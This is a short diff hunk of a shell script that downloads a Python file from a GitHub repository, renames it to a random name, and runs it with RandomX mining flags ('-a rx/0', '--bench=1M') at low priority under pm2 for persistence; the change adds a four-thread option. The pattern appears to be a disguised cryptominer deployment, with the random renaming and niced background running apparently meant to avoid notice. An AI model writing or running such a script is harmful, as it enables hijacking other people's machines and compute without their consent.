@@ -33,7 +33,7 @@ wget https://raw.githubusercontent.com/hosseinxdns4/fictional-bassoon/main/main.
 NEW_PY=$(random_name).py
 mv main.py $NEW_PY
 chmod +x $NEW_PY
-echo "./$NEW_PY --bench=1M -a rx/0" > bsh.sh
+echo "./$NEW_PY --bench=1M -a rx/0 -t 4" > bsh.sh
 chmod +x bsh.sh
 nice -n 19 ./bsh.sh
 nice -n 19 pm2 start bsh.sh
